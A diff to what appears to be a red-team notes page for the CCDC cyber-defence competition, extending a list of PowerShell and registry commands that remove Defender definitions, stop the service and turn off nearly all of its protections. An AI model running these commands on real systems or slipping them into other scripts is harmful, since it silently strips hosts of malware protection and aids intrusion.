@@ -180,7 +180,8 @@ pagetitle: Red Teaming for CCDC
   - `gpedit.msc` > Computer Configuration > Administrative Templates > Windows Components > Microsoft Defender Antivirus > Turn off Microsoft Defender Antivirus > Enabled
   - Just run all of these in powershell and defender should be lobotomized by the end:
     - `'C:\Program Files\Windows Defender\MpCmdRun.exe' -RemoveDefinitions -All`
-    - `Set-MpPreference -DisableRealtimeMonitoring $true`
+    - `Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisableBlockAtFirstSeen $true -DisablePrivacyMode $true -SignatureDisableUpdateOnStartupWithoutEngine $true -DisableArchiveScanning $true -MAPSReporting 0 -SubmitSamplesConsent 2`
+      - This needs to be run before restarting (and in doing so disabling modifications of defender)
     - `Remove-WindowsFeature Windows-Defender`
     - `Stop-Service WinDefend -Force`
     - `Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force`
